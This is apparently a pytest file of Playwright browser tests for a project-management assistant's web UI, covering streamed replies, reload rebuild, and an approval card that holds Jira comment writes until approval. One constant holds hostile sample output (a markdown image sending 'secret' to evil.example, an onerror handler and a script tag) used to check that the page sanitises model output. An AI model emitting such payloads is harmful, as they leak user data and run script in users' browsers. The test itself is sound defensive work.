"""The page itself, in a real browser, offline (audit #7).

A real uvicorn server runs `create_app` with a ScriptedModel factory and a fake
Jira, and Chromium drives the page like a person: type, press Enter, click.
Covers what the API tests can't: the SSE parser, rendering, the approval card,
reload rebuild, and that model output can't inject markup.

Skips unless Playwright's Chromium can launch. On WSL without system libraries,
point PMAGENT_CHROMIUM_LIBS at extracted libnss3/libnspr4/libasound (see
scripts/ui_screenshots.py).
"""

from __future__ import annotations

import os
import threading
import time

import pytest
import uvicorn

import pmagent.tools.jira.tools_read as tools_read
import pmagent.tools.jira.tools_write as tools_write
from pmagent.assistant import PMAssistant
from pmagent.web.app import create_app
from tests.fakes import ScriptedModel, call, reasoning, text

sync_api = pytest.importorskip("playwright.sync_api")

EVIL = ('Here you go. ![pixel](https://evil.example/leak?d=secret) '
        '<img src=x onerror="document.title=\'pwned\'"> <script>document.title="pwned"</script> '
        '<a href="https://example.com">a link</a>')


class FakeJira:
    comments: list = []

    def add_comments(self, keys, comment):
        FakeJira.comments.append((keys, comment))
        return [{"key": k, "error": None} for k in keys]

    def list_transitions(self, key):
        return [{"name": "Done", "to_status": "Done"}]


@pytest.fixture
def server(monkeypatch):
    FakeJira.comments = []
    monkeypatch.setattr(tools_write, "get_client", lambda: FakeJira())
    monkeypatch.setattr(tools_read, "get_client", lambda: FakeJira())
    scripts = {
        "where": [[reasoning("They want transitions. Look them up."),
                   call("list_jira_transitions", issue_key="CSCI-1")],
                  [text("**CSCI-1** can move to *Done*.")]],
        "comment": [[call("add_jira_comment", issue_keys=["CSCI-1"], comment="chasing this")],
                    [text("Posted.")]],
        "evil": [[text(EVIL)]],
    }

    def factory(recorder):
        # One conversation per page; the script is chosen by the first message.
        model = ScriptedModel([lambda messages: scripts[key(messages)].pop(0)] * 3)
        return PMAssistant(model=model, classify=lambda m, p: "ticket", **recorder.assistant_kwargs())

    def key(messages):
        first = next(m for m in messages if m["role"] == "user")["content"][0]["text"]
        return next(k for k in scripts if k in first)

    config = uvicorn.Config(create_app(factory), host="127.0.0.1", port=0, log_level="warning")
    srv = uvicorn.Server(config)
    thread = threading.Thread(target=srv.run, daemon=True)
    thread.start()
    deadline = time.time() + 10
    while not srv.started:
        assert time.time() < deadline
        time.sleep(0.02)
    port = srv.servers[0].sockets[0].getsockname()[1]
    yield f"http://127.0.0.1:{port}"
    srv.should_exit = True
    thread.join(timeout=10)


@pytest.fixture
def page():
    launch_env = dict(os.environ)
    if os.environ.get("PMAGENT_CHROMIUM_LIBS"):
        launch_env["LD_LIBRARY_PATH"] = os.environ["PMAGENT_CHROMIUM_LIBS"]
    with sync_api.sync_playwright() as p:
        try:
            browser = p.chromium.launch(env=launch_env)
        except Exception as exc:  # noqa: BLE001
            pytest.skip(f"Chromium unavailable: {str(exc).splitlines()[0]}")
        pg = browser.new_page(viewport={"width": 1280, "height": 900})
        pg.console_errors = []
        pg.on("console", lambda m: pg.console_errors.append(m.text) if m.type == "error" else None)
        pg.on("pageerror", lambda e: pg.console_errors.append(str(e)))
        yield pg
        browser.close()


def ask(page, message):
    page.fill("#message", message)
    page.press("#message", "Enter")


def open_app(page, base):
    page.goto(base + "/")
    page.wait_for_selector("#meta-line:not(:text('connecting…'))")


def test_a_turn_streams_into_chat_and_chain_and_survives_a_reload(server, page):
    open_app(page, server)
    ask(page, "where can CSCI-1 go?")
    page.wait_for_selector(".pill--completed", timeout=15_000)

    assert page.inner_text(".msg--agent .msg__body strong") == "CSCI-1"      # Markdown rendered
    chain = page.inner_text("#chain")
    for step in ("route → ticket_agent", "model reasoning", "They want transitions",
                 "list_jira_transitions", "ok", "turn complete"):
        assert step in chain, step
    steps_before = page.locator(".step").count()

    page.reload()
    page.wait_for_selector(".pill--completed", timeout=10_000)
    assert page.locator(".step").count() == steps_before                     # chain rebuilt
    assert "CSCI-1" in page.inner_text(".msg--agent .msg__body")               # chat rebuilt
    assert page.is_enabled("#send")                                            # not left locked
    assert page.console_errors == []


def test_the_approval_card_gates_the_write_until_approve_is_clicked(server, page):
    open_app(page, server)
    ask(page, "comment on CSCI-1")
    page.wait_for_selector(".approval", timeout=15_000)

    card = page.inner_text(".approval")
    assert "Comment on 1 issue(s): CSCI-1" in card and "chasing this" in card
    assert FakeJira.comments == []                            # nothing written yet
    assert page.is_disabled("#send")                          # composer waits for the decision

    page.click(".approval >> text=Approve")
    page.wait_for_selector(".pill--completed", timeout=15_000)
    assert FakeJira.comments == [(["CSCI-1"], "chasing this")]
    assert "Approved" in page.inner_text(".approval")
    assert page.is_enabled("#send")
    assert page.console_errors == []


def test_model_output_cannot_inject_markup(server, page):
    open_app(page, server)
    ask(page, "evil test")
    page.wait_for_selector(".pill--completed", timeout=15_000)

    body = page.locator(".msg--agent .msg__body")
    assert body.locator("img").count() == 0                   # no tracking pixel, no onerror
    assert body.locator("script").count() == 0
    assert page.title() == "PM Agent"                         # nothing executed
    link = body.locator("a")
    assert link.get_attribute("rel") == "noopener noreferrer" and link.get_attribute("target") == "_blank"
